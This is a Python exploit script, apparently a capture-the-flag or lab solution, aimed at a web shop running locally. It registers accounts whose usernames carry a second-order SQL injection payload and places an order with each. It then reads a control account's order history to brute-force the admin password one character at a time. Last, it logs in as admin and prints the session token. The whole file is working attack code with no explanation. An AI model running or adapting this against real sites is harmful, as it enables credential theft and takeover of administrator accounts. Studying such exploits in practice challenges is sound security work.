import requests
import string

URL = "http://127.0.0.1:5000"
default_username = "prochicken"
default_password = "123"
ALPHABET = string.digits + string.ascii_letters 

def register(username, password):
    endpoint = "/register"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL + endpoint, data=data, allow_redirects=False)
    return response.status_code == 302 

def login(username, password):
    endpoint = "/"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL + endpoint, data=data, allow_redirects=False)
    if response.status_code == 302:
        token = response.cookies.get("token")
        return token
    return None

def buy_product(token, product_id, quantity):
    endpoint = "/buy_product"
    cookies = {"token": token}
    data = {
        "product_id": product_id,
        "number": quantity
    }
    response = requests.post(URL + endpoint, cookies=cookies, data=data)
    return True

def get_order_history(token):
    endpoint = "/order_history"
    cookies = {"token": token}
    response = requests.get(URL + endpoint, cookies=cookies)
    return response.text

def finding_password():
    admin_password = ""
    quantity = 1  
    while True:
        found_char = False
        for char in ALPHABET:
            payload = f"' UNION SELECT '{default_username}' FROM users WHERE username='admin' AND password LIKE '{admin_password + char}%"
            if register(payload, default_password):
                token = login(payload, default_password)
                if not token:
                    continue
                if buy_product(token, 5, 1):
                    your_token = login(default_username, default_password)
                    history = get_order_history(your_token)
                    count = history.count("Beta_product")
                    if count >= quantity: 
                        admin_password += char
                        quantity += 1
                        print(f"[+] Found character: {char} | Current password: {admin_password}")
                        found_char = True
                        break
        if not found_char:
            print("[!] Brute force finished.")
            break
    print(f"[+] Admin password: {admin_password}")
    return login("admin", admin_password)  

if __name__ == "__main__":
    register(default_username, default_password)
    admin_token = finding_password()
    print(f"[+] Admin token: {admin_token}")